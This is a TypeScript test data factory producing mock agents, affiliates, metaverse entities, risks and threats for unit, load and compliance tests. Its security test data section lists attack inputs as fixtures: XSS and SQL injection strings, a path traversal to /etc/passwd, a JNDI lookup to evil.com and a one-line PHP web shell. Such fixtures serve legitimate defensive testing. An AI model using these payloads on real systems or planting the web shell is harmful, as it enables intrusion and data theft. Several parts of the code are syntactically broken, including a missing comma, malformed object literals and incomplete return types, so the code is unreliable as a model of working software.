/**
 * @file Test Data Factory
 * @description Factory for generating test data and fixtures for all system components
 */

import { MockAgent, MockEnvironment, MockConversion, MockAffiliate, MockMetaverseEntity, MockRisk, MockThreat } from '../types';

/**
 * Test Data Factory for creating consistent test data across all system components
 */
export class TestDataFactory {
  private static readonly ENVIRONMENT_TYPES = ['development', 'staging', 'production', 'test'] as const;
  private static readonly ENTITY_TYPES = ['virtual-space', 'avatar', 'object', 'interaction'] as const;
  private static readonly RISK_LEVELS = ['low', 'medium', 'high', 'critical'] as const;
  private static readonly COMPLIANCE_LEVELS = ['basic', 'intermediate', 'advanced', 'expert'] as const;
  private static readonly THREAT_TYPES = ['malware', 'anomaly', 'injection', 'xss', 'data-breach', 'unauthorized-access'] as const;

  /**
   * Create mock agent with realistic data
   */
  static createMockAgent(overrides?: Partial<MockAgent>): MockAgent {
    const baseAgent: MockAgent = {
      id: `agent-${Math.random().toString(36).substring(7)}`,
      type: overrides?.type || 'test-agent',
      status: overrides?.status || 'active',
      capabilities: overrides?.capabilities || ['reasoning', 'analysis', 'learning'],
      createdAt: overrides?.createdAt || Date.now(),
      performance: {
        responseTime: 50 + Math.random() * 100, // 50-150ms
        accuracy: 0.85 + Math.random() * 0.15, // 85-100%
        reliability: 0.9 + Math.random() * 0.1 // 90-100%
        uptime: 0.95 + Math.random() * 0.05 // 95-100%
      },
      configuration: {
        maxConcurrentTasks: 5,
        memoryLimit: '512MB',
        timeoutMs: 30000
      },
      learning: {
        episodesCompleted: Math.floor(Math.random() * 1000),
        successRate: 0.8 + Math.random() * 0.2,
        lastTrainingDate: new Date(Date.now() - Math.random() * 7 * 24 * 60 * 60 * 1000)
      }
    };

    return { ...baseAgent, ...overrides };
  }

  /**
   * Create mock environment for testing
   */
  static createMockEnvironment(overrides?: Partial<MockEnvironment>): MockEnvironment {
    const baseEnvironment: MockEnvironment = {
      id: `env-${Math.random().toString(36).substring(7)}`,
      name: overrides?.name || 'Test Environment',
      status: overrides?.status || 'healthy',
      components: overrides?.components || ['agentdb', 'reasoningbank', 'governance'],
      metrics: {
        cpuUsage: 20 + Math.random() * 30, // 20-50%
        memoryUsage: 60 + Math.random() * 20, // 60-80%
        diskUsage: 30 + Math.random() * 15, // 30-45%
        networkLatency: 10 + Math.random() * 20, // 10-30ms
        errorRate: 0.01 + Math.random() * 0.02 // 1-3%
      },
      configuration: {
        version: '1.0.0',
        region: 'us-west-2',
        timezone: 'UTC',
        backupRetention: 30, // days
        monitoringEnabled: true
      }
    };

    return { ...baseEnvironment, ...overrides };
  }

  /**
   * Create mock conversion data
   */
  static createMockConversion(overrides?: Partial<MockConversion>): MockConversion {
    const baseConversion: MockConversion = {
      id: `conv-${Math.random().toString(36).substring(7)}`,
      affiliateId: overrides?.affiliateId || 'affiliate-001',
      amount: overrides?.amount || 50 + Math.random() * 500,
      timestamp: overrides?.timestamp || Date.now(),
      source: overrides?.source || 'organic-search',
      userAgent: overrides?.userAgent || 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
      ipAddress: overrides?.ipAddress || '192.168.1.' + Math.floor(Math.random() * 255),
      metadata: overrides?.metadata || {
        campaign: `campaign-${Math.floor(Math.random() * 10)}`,
        referrer: 'https://example.com',
        deviceType: 'desktop'
      }
    };

    return { ...baseConversion, ...overrides };
  }

  /**
   * Create mock affiliate data
   */
  static createMockAffiliate(overrides?: Partial<MockAffiliate>): MockAffiliate {
    const baseAffiliate: MockAffiliate = {
      id: overrides?.id || 'affiliate-001',
      name: overrides?.name || 'Test Affiliate',
      status: overrides?.status || 'active',
      createdAt: overrides?.createdAt || Date.now() - Math.random() * 30 * 24 * 60 * 60 * 1000,
      metrics: {
        clicks: Math.floor(Math.random() * 10000) + 1000,
        conversions: Math.floor(Math.random() * 100) + 50,
        revenue: (Math.floor(Math.random() * 10000) + 50) * 100 + Math.random() * 500,
        chargebacks: Math.floor(Math.random() * 5)
      },
      paymentInfo: {
        method: overrides?.paymentInfo?.method || 'bank',
        accountNumber: overrides?.paymentInfo?.accountNumber || '****1234',
        routingNumber: overrides?.paymentInfo?.routingNumber || '123456789',
        payoutFrequency: overrides?.paymentInfo?.payoutFrequency || 'monthly'
      }
    };

    return { ...baseAffiliate, ...overrides };
  }

  /**
   * Create mock metaverse entity
   */
  static createMockMetaverseEntity(overrides?: Partial<MockMetaverseEntity>): MockMetaverseEntity {
    const entityType = overrides?.type || this.ENTITY_TYPES[Math.floor(Math.random() * this.ENTITY_TYPES.length)];
    
    const baseEntity: MockMetaverseEntity = {
      id: overrides?.id || `entity-${Math.random().toString(36).substring(7)}`,
      type: entityType,
      properties: {
        name: overrides?.properties?.name || `Test ${entityType}`,
        description: overrides?.properties?.description || `A test ${entityType} for unit testing`,
        capacity: overrides?.properties?.capacity || 100 + Math.floor(Math.random() * 500),
        features: overrides?.properties?.features || this.generateEntityFeatures(entityType),
        metadata: overrides?.properties?.metadata || this.generateEntityMetadata(entityType)
      },
      embeddings: new Array(1536).fill(0.1).map((v, i) => v + i * 0.001),
      temporalContext: {
        createdAt: overrides?.temporalContext?.createdAt || Date.now(),
        validFrom: overrides?.temporalContext?.validFrom || Date.now(),
        validUntil: overrides?.temporalContext?.validUntil || Date.now() + 365 * 24 * 60 * 60 * 1000
      },
      spatialContext: {
        position: overrides?.spatialContext?.position || { 
          x: Math.random() * 100, 
          y: Math.random() * 100, 
          z: Math.random() * 10 
        },
        area: overrides?.spatialContext?.area || `test-area-${Math.floor(Math.random() * 10)}`,
        permissions: overrides?.spatialContext?.permissions || ['read', 'write', 'interact']
      },
      semanticContext: {
        tags: overrides?.semanticContext?.tags || this.generateEntityTags(entityType),
        categories: overrides?.semanticContext?.categories || this.generateEntityCategories(entityType),
        relationships: overrides?.semanticContext?.relationships || this.generateEntityRelationships(entityType)
      },
      groundingStatus: overrides?.groundingStatus || 'ungrounded'
    };

    return { ...baseEntity, ...overrides };
  }

  /**
   * Create mock risk data
   */
  static createMockRisk(overrides?: Partial<MockRisk>): MockRisk {
    const riskLevel = overrides?.type || this.RISK_LEVELS[Math.floor(Math.random() * this.RISK_LEVELS.length)];
    
    const baseRisk: MockRisk = {
      id: overrides?.id || `risk-${Math.random().toString(36).substring(7)}`,
      type: riskLevel,
      probability: overrides?.probability || 0.1 + Math.random() * 0.8, // 10-90%
      impact: overrides?.impact || 0.5 + Math.random() * 0.5, // 50-100%
      timestamp: overrides?.timestamp || Date.now(),
      description: overrides?.description || `Test ${riskLevel} risk for unit testing`,
      affectedComponents: overrides?.affectedComponents || ['system', 'data', 'users'],
      mitigation: overrides?.mitigation || this.generateRiskMitigation(riskLevel)
    };

    return { ...baseRisk, ...overrides };
  }

  /**
   * Create mock threat data
   */
  static createMockThreat(overrides?: Partial<MockThreat>): MockThreat {
    const threatType = overrides?.type || this.THREAT_TYPES[Math.floor(Math.random() * this.THREAT_TYPES.length)];
    
    const baseThreat: MockThreat = {
      id: overrides?.id || `threat-${Math.random().toString(36).substring(7)}`,
      type: threatType,
      source: overrides?.source || `source-${Math.floor(Math.random() * 10)}`,
      confidence: overrides?.confidence || 0.7 + Math.random() * 0.3, // 70-100%
      indicators: overrides?.indicators || this.generateThreatIndicators(threatType),
      timestamp: overrides?.timestamp || Date.now()
    };

    return { ...baseThreat, ...overrides };
  }

  /**
   * Generate entity features based on type
   */
  private static generateEntityFeatures(entityType: string): string[] {
    const featureMap = {
      'virtual-space': ['audio', 'video', 'interaction', 'persistence', 'customization'],
      'avatar': ['appearance', 'clothing', 'accessories', 'animations', 'voice'],
      'object': ['physics', 'interactivity', 'state', 'properties', 'scripts'],
      'interaction': ['triggers', 'events', 'behaviors', 'responses']
    };

    return featureMap[entityType] || ['basic'];
  }

  /**
   * Generate entity metadata based on type
   */
  private static generateEntityMetadata(entityType: string): Record<string, any> {
    const metadataMap = {
      'virtual-space': { 
        maxOccupancy: 100, 
        accessLevel: 'public',
        features: ['spatial-audio', 'text-chat']
      },
      'avatar': { 
        customizationLevel: 'high',
        defaultOutfit: 'casual'
      },
      'object': { 
        physics: 'realistic',
        interactive: true
      },
      'interaction': { 
        responseType: 'programmatic',
        eventTypes: ['click', 'hover', 'enter', 'exit']
      }
    };

    return metadataMap[entityType] || {};
  }

  /**
   * Generate entity tags based on type
   */
  private static generateEntityTags(entityType: string): string[] {
    const tagMap = {
      'virtual-space': ['environment', 'social', 'meeting', 'collaboration'],
      'avatar': ['user', 'identity', 'social-profile'],
      'object': ['interactive', 'tool', 'decorative', 'functional'],
      'interaction': ['behavioral', 'analytical', 'responsive']
    };

    return tagMap[entityType] || [];
  }

  /**
   * Generate entity relationships based on type
   */
  private static generateEntityRelationships(entityType: string): Record<string, string> {
    const relationshipMap = {
      'virtual-space': { 
        contains: 'contains-object', 'contains-avatar',
        connected_to: 'connected-to', 'adjacent-to',
        part_of: 'part-of'
      },
      'avatar': { 
        belongs_to: 'belongs-to',
        interacts_with: 'interacts-with',
        wears: 'wears'
      },
      'object': { 
        affects: 'affects',
        depends_on: 'depends-on',
        triggers: 'triggers'
      },
      'interaction': { 
        precedes: 'precedes',
        follows: 'follows',
        responds_to: 'responds-to'
      }
    };

    return relationshipMap[entityType] || {};
  }

  /**
   * Generate risk mitigation strategies
   */
  private static generateRiskMitigation(riskLevel: string): string[] {
    const mitigationMap = {
      'low': ['monitor', 'log', 'review'],
      'medium': ['automated-response', 'escalate', 'additional-validation'],
      'high': ['immediate-isolation', 'manual-review', 'stakeholder-notification'],
      'critical': ['emergency-shutdown', 'forensic-analysis', 'incident-response']
    };

    return mitigationMap[riskLevel] || ['monitor'];
  }

  /**
   * Generate threat indicators based on type
   */
  private static generateThreatIndicators(threatType: string): string[] {
    const indicatorMap = {
      'malware': ['unusual-process-activity', 'file-modification', 'network-connections', 'registry-changes'],
      'anomaly': ['statistical-outliers', 'behavioral-changes', 'performance-degradation', 'resource-exhaustion'],
      'injection': ['sql-patterns', 'script-tags', 'parameter-manipulation', 'command-injection'],
      'xss': ['script-tags', 'event-handlers', 'dom-manipulation', 'cookie-manipulation'],
      'data-breach': ['unauthorized-access', 'data-exfiltration', 'privilege-escalation', 'unusual-data-transfer'],
      'unauthorized-access': ['failed-authentication', 'brute-force-attempts', 'token-theft', 'session-hijacking']
    };

    return indicatorMap[threatType] || ['unknown-pattern'];
  }

  /**
   * Generate test data sets
   */
  static generateTestDataSets(): {
    return {
      agents: Array.from({ length: 10 }, (_, i) => this.createMockAgent({
        type: ['reasoning', 'analysis', 'learning'][i % 3],
        status: i % 5 === 0 ? 'inactive' : 'active'
      })),
      
      environments: Array.from({ length: 5 }, (_, i) => this.createMockEnvironment({
        status: i % 3 === 0 ? 'degraded' : 'healthy',
        components: ['agentdb', 'reasoningbank', 'governance', 'claude'].slice(0, i + 1)
      })),
      
      conversions: Array.from({ length: 50 }, (_, i) => this.createMockConversion({
        affiliateId: `affiliate-${i % 5}`,
        amount: 25 + (i * 10),
        source: ['organic', 'paid', 'social', 'email'][i % 4]
      })),
      
      affiliates: Array.from({ length: 3 }, (_, i) => this.createMockAffiliate({
        name: `Test Affiliate ${i + 1}`,
        status: i === 0 ? 'pending' : 'active'
      })),
      
      metaverseEntities: Array.from({ length: 20 }, (_, i) => this.createMockMetaverseEntity({
        type: this.ENTITY_TYPES[i % this.ENTITY_TYPES.length]
      })),
      
      risks: Array.from({ length: 15 }, (_, i) => this.createMockRisk({
        type: this.RISK_LEVELS[i % this.RISK_LEVELS.length]
      })),
      
      threats: Array.from({ length: 8 }, (_, i) => this.createMockThreat({
        type: this.THREAT_TYPES[i % this.THREAT_TYPES.length]
      }))
    };
  }

  /**
   * Generate performance test data
   */
  static generatePerformanceTestData(): {
    return {
      highVolumeAgents: Array.from({ length: 1000 }, (_, i) => this.createMockAgent({
        type: 'performance-test-agent'
      })),
      
      highVolumeConversions: Array.from({ length: 5000 }, (_, i) => this.createMockConversion({
        amount: 100 + (i % 10)
      })),
      
      stressTestEntities: Array.from({ length: 10000 }, (_, i) => this.createMockMetaverseEntity({
        type: 'virtual-space'
      })),
      
      loadTestRisks: Array.from({ length: 1000 }, (_, i) => this.createMockRisk({
        type: this.RISK_LEVELS[Math.floor(Math.random() * this.RISK_LEVELS.length)]
      }))
    };
  }

  /**
   * Generate security test data
   */
  static generateSecurityTestData(): {
    return {
      maliciousInputs: [
        '<script>alert("xss")</script>',
        "'; DROP TABLE users; --",
        '../../../etc/passwd',
        '${jndi:ldap://evil.com}',
        "1' OR '1'='1'--",
        '<svg onload=alert("xss")>',
        '{{7*7}}',
        '%00%00'
      ],
      
      sqlInjectionAttempts: [
        "SELECT * FROM users WHERE id = 1 OR '1'='1",
        "'; DROP TABLE users; --",
        "1' UNION SELECT username, password FROM admins --",
        "admin'/**/OR/**/1/**/=/**/1--",
        "1' WAITFOR DELAY '0:0:5'--"
      ],
      
      maliciousFiles: [
        {
          name: 'malware.exe',
          content: Buffer.from([0x4D, 0x5A, 0x88]),
          mimeType: 'application/octet-stream'
        },
        {
          name: 'script.php',
          content: '<?php system($_GET["cmd"]);?>',
          mimeType: 'application/x-php'
        },
        {
          name: 'huge-file.txt',
          content: Buffer.alloc(100 * 1024 * 1024),
          mimeType: 'text/plain'
        },
        {
          name: 'config.ini',
          content: '[database]\npassword="secret"',
          mimeType: 'text/plain'
        }
      ],
      
      authenticationAttempts: [
        {
          apiKey: 'invalid-key',
          timestamp: Date.now(),
          result: 'invalid'
        },
        {
          apiKey: 'expired-key',
          timestamp: Date.now() - 3600000,
          result: 'expired'
        },
        {
          apiKey: 'valid-key',
          timestamp: Date.now(),
          result: 'valid',
          permissions: ['read', 'write']
        },
        {
          apiKey: 'valid-key-revoked',
          timestamp: Date.now(),
          result: 'revoked'
        }
      ],
      
      accessControlTests: [
        {
          userId: 'admin-user',
          resource: '/admin/users',
          action: 'delete',
          expected: 'allowed'
        },
        {
          userId: 'moderator-user',
          resource: '/admin/users',
          action: 'delete',
          expected: 'denied'
        },
        {
          userId: 'regular-user',
          resource: '/api/data',
          action: 'read',
          expected: 'allowed'
        },
        {
          userId: 'guest-user',
          resource: '/api/data',
          action: 'write',
          expected: 'denied'
        }
      ]
    };
  }

  /**
   * Generate compliance test data
   */
  static generateComplianceTestData(): {
    return {
      gdprRequirements: [
        {
          id: 'data-minimization',
          requirement: 'Collect only necessary data',
          testData: { name: 'John', email: 'john@example.com' },
          expectedValid: true
        },
        {
          id: 'data-minimization',
          requirement: 'Collect only necessary data',
          testData: { name: 'John', email: 'john@example.com', ssn: '123-45-6789' }, // Unnecessary SSN
          expectedValid: false
        },
        {
          id: 'right-to-erasure',
          requirement: 'Provide data deletion capability',
          testData: { userId: 'user-001', deletionRequest: true },
          expectedValid: true
        },
        {
          id: 'right-to-erasure',
          requirement: 'Provide data deletion capability',
          testData: { userId: 'user-002', deletionRequest: false },
          expectedValid: false
        }
      ],
      
      hipaaRequirements: [
        {
          id: 'phi-protection',
          requirement: 'Protect Protected Health Information',
          testData: {
            hasEncryption: true,
            hasAccessControls: true,
            hasAuditTrail: true,
            hasBusinessAssociateAgreements: true
          },
          expectedValid: true
        },
        {
          id: 'phi-protection',
          requirement: 'Protect Protected Health Information',
          testData: {
            hasEncryption: false, // Missing encryption
            hasAccessControls: true,
            hasAuditTrail: true,
            hasBusinessAssociateAgreements: true
          },
          expectedValid: false
        }
      ],
      
      pciDssRequirements: [
        {
          id: 'cardholder-data',
          requirement: 'Protect cardholder data',
          testData: {
            hasEncryption: true,
            hasAccessControls: true,
            hasNetworkSecurity: true,
            hasVulnerabilityScanning: true
          },
          expectedValid: true
        },
        {
          id: 'cardholder-data',
          requirement: 'Protect cardholder data',
          testData: {
            hasEncryption: false, // Missing encryption
            hasAccessControls: true,
            hasNetworkSecurity: true,
            hasVulnerabilityScanning: true
          },
          expectedValid: false
        }
      ]
    };
  }

  /**
   * Create load testing scenarios
   */
  static generateLoadTestScenarios(): {
    return {
      lowConcurrency: {
        concurrency: 10,
        duration: 10000,
        rampUpTime: 2000,
        operations: 100
      },
      
      mediumConcurrency: {
        concurrency: 50,
        duration: 30000,
        rampUpTime: 5000,
        operations: 500
      },
      
      highConcurrency: {
        concurrency: 100,
        duration: 60000,
        rampUpTime: 10000,
        operations: 1000
      },
      
      sustainedLoad: {
        concurrency: 25,
        duration: 300000, // 5 minutes
        rampUpTime: 15000,
        operations: 1000
      },
      
      stressTest: {
        concurrency: 200,
        duration: 120000, // 2 minutes
        rampUpTime: 30000,
        operations: 2000,
        resourceLimits: {
          memory: '1GB',
          cpu: '80%'
        }
      }
    };
  }

  /**
   * Clear all test data
   */
  static clearTestData(): void {
    // Implementation would clear any temporary test data
    console.log('Test data cleared');
  }

  /**
   * Get test data statistics
   */
  static getTestDataStats(): Record<string, any> {
    return {
      totalAgents: 10,
      totalEnvironments: 5,
      totalConversions: 50,
      totalAffiliates: 3,
      totalEntities: 20,
      totalRisks: 15,
      totalThreats: 8,
      dataGenerationTime: new Date().toISOString()
    };
  }
}